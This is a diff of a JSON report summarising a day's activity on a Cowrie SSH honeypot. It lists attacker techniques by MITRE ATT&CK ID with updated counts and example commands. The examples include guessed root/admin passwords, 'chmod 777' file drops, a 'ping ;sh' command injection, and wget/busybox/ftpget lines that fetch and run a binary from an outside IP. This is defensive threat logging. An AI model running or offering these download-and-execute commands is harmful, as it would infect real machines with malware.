@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-04 02:01:44",
+  "generated": "2026-09-04 03:01:11",
   "totals": {
-    "commands": 40,
-    "login_failed": 90,
-    "login_success": 11,
-    "sessions": 103
+    "commands": 71,
+    "login_failed": 240,
+    "login_success": 14,
+    "sessions": 261
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 90,
+      "count": 240,
       "examples": [
         "root / abcd12345",
         "admin / yess",
@@ -21,14 +21,14 @@
         "root / Arian"
       ],
       "first": "2026-09-04T00:00:06.722859Z",
-      "last": "2026-09-04T01:59:06.298330Z",
-      "unique_ips": 30
+      "last": "2026-09-04T02:56:12.423569Z",
+      "unique_ips": 42
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 15,
+      "count": 30,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -37,14 +37,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-04T00:25:16.590506Z",
-      "last": "2026-09-04T00:25:55.281880Z",
-      "unique_ips": 1
+      "last": "2026-09-04T02:32:38.347286Z",
+      "unique_ips": 2
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 11,
+      "count": 14,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "support / letmein",
@@ -53,14 +53,14 @@
         "root / "
       ],
       "first": "2026-09-04T00:10:27.211479Z",
-      "last": "2026-09-04T01:27:20.467115Z",
-      "unique_ips": 10
+      "last": "2026-09-04T02:39:10.120678Z",
+      "unique_ips": 13
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 4,
+      "count": 8,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -68,20 +68,20 @@
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
       ],
       "first": "2026-09-04T00:25:18.578399Z",
-      "last": "2026-09-04T00:25:55.281880Z",
-      "unique_ips": 1
+      "last": "2026-09-04T02:32:38.347286Z",
+      "unique_ips": 2
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 2,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-04T00:25:18.578399Z",
-      "last": "2026-09-04T00:25:18.578399Z",
-      "unique_ips": 1
+      "last": "2026-09-04T02:32:02.969248Z",
+      "unique_ips": 2
     },
     {
       "id": "T1082",
@@ -102,16 +102,20 @@
       8
     ],
     [
+      "/bin/busybox",
+      7
+    ],
+    [
       "system",
-      3
+      4
     ],
     [
       "shell",
-      3
+      4
     ],
     [
       "sh",
-      3
+      4
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -119,22 +123,26 @@
     ],
     [
       "enable",
-      1
+      2
     ],
     [
       "linuxshell",
-      1
+      2
     ],
     [
       "enablelinuxshell",
-      1
+      2
     ],
     [
       "ping ;sh",
-      1
+      2
     ],
     [
       "cd /proc && cat self/cmdline",
+      2
+    ],
+    [
+      "busybox",
       1
     ]
   ]
